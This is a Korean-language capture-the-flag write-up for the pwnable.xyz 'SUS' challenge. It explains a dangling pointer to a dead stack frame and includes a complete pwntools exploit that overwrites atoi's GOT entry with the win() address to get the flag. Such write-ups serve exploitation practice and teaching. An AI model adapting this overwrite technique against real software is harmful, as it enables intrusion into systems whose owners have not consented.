# [pwnable.xyz] SUS

> Single User Storage

## The Bug

![image](https://github.com/user-attachments/assets/06b101a5-e7ee-4a2b-af4c-4fb51e707b91)

`create_user()`에서 지역 변수인 `name`의 주소를 `cur`에 넣는다. `create_user()`가 종료된 이후에 `cur`에 접근하면 더 이상 존재하지 않는 스택 프레임에 접근하게 된다.

## Exploit

`edit_usr()`에서 age를 입력받기 위해 `read_int32()`를 호출하는데, 이때 스택에 저장된 `cur`의 `name` 포인터를 덮어쓸 수 있다.

![image](https://github.com/user-attachments/assets/7996f4b1-9b5d-4bfa-85b7-bf6ecb8dbbc1)

![image](https://github.com/user-attachments/assets/c3a8cb74-37cb-4b7c-89cb-75251d89a808)

`name` 포인터를 임의의 주소로 덮어쓰면 그 주소에 임의의 `0x20`바이트 값을 입력할 수 있다. `atoi()`의 GOT에 `win()`의 주소를 넣으면 플래그를 획득할 수 있다.

```python
from pwn import *

r = remote("svc.pwnable.xyz", 30011)

sla = r.sendlineafter
sa = r.sendafter


def create_user(name, age):
    sla(b"> ", b"1")
    sa(b"Name: ", name)
    sla(b"Age: ", age)


def print_user():
    sla(b"> ", b"2")


def edit_user(name, age):
    sla(b"> ", b"3")
    sa(b"Name: ", name)
    sla(b"Age: ", age)


win = 0x400B71
atoi_got = 0x602068

create_user(b"a", b"1")
edit_user(b"a", b"1" + b"a" * 0xF + p64(atoi_got))
edit_user(p64(win), b"1")

r.interactive()
```

![image](https://github.com/user-attachments/assets/9f0af595-fe16-443c-93e3-659b85936852)
